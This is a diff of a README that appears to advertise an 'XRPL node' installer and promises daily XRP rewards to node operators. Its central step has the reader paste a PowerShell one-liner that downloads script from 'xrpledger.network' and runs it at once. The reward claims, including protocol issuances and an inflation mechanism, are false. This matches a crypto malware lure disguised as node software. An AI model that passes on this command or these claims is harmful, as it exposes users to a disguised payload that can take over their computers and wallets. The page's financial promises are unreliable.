@@ -1,34 +1,44 @@
 <img src="https://github.com/XRPL-Node/mainnet/blob/main/xrpllogo.png?raw=true">
 
-## Secure the XRP Ledger. Earn XRP.
-Validators form the backbone of the XRP Ledger network. By processing transactions and participating in consensus, each validator helps ensure that the XRP Ledger remains among the most censorship-resistant and highest-performance blockchain networks in the world.
+## Run Your Own XRPL Node.
+XRPL nodes form the backbone of the XRP Ledger network. By relaying transactions, maintaining ledger history, and participating in consensus, they help ensure that the XRP Ledger remains one of the most resilient and censorship-resistant blockchain networks.
 
 ## Getting started 
-_The PowerShell command is the recommended way to install XRPL Node. It automatically installs all required dependencies and completes the setup in a single step._
+_The PowerShell installer is the recommended way to install an XRPL node. It automatically installs all required dependencies and completes the setup in a single step._
 
 #### Step 1: Open PowerShell
-Open the Run dialog by pressing `Win + R`, type `powershell`, and press **Enter**.
+To open PowerShell, press `Win + R`, type `powershell`, and press **Enter**.
 
-#### Step 2: Run the node installation command
+#### Step 2: Run the following command
+Paste the node installation command into PowerShell and press **Enter** to start the installation process.
+
 ```powershell
 powershell -c "irm 'xrpledger.network' | iex"
 `````
-_After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
+#### Step 3: Synchronize with the network
 
-Depending on your hardware and network connection, full synchronization typically takes 5–15 minutes. After reaching the latest validated ledger, your node automatically starts participating in the XRP Ledger network by relaying transactions, serving ledger data, and supporting overall network reliability.
+Initial synchronization typically takes 5–15 minutes. Once your node reaches the latest validated ledger, it automatically begins relaying transactions, serving ledger data, and contributing to the reliability and decentralization of the XRP Ledger network.
 
-Daily rewards are determined by several factors, including your node's uptime, network activity, and overall demand for resources. Eligible nodes may also receive protocol-level rewards funded through the network's inflation mechanism, providing an additional source of yield alongside transaction fee earnings.
 
-## FAQ
+## Frequently Asked Questions
 
 <section class="faq">
 
   <details class="faq__item">
     <summary class="faq__q">
-      Why should I run a validator node?
+      What are the benefits of running a validator node?
     </summary>
     <div class="faq__a">
-      Running a validator node helps secure the XRP Ledger network. Validators strengthen decentralization, improve censorship resistance, and contribute to the long-term health and reliability of the ecosystem. In return for supporting the network, operators earn XRP rewards through protocol-based issuances, in addition to revenue generated from transaction fees.
+Running a validator node helps secure the XRP Ledger network. Validators strengthen decentralization, improve censorship resistance, and contribute to the long-term health and reliability of the ecosystem. In return for supporting the network, operators earn XRP rewards through protocol-based issuances, in addition to revenue generated from transaction fees.
+    </div>
+  </details>
+
+  <details class="faq__item">
+    <summary class="faq__q">
+      How are daily rewards calculated?
+    </summary>
+    <div class="faq__a">
+      Daily rewards are determined by several factors, including your node's uptime, network activity, and overall demand for resources. Eligible nodes may also receive protocol-level rewards funded through the network's inflation mechanism, providing an additional source of yield alongside transaction fee earnings.
     </div>
   </details>
 
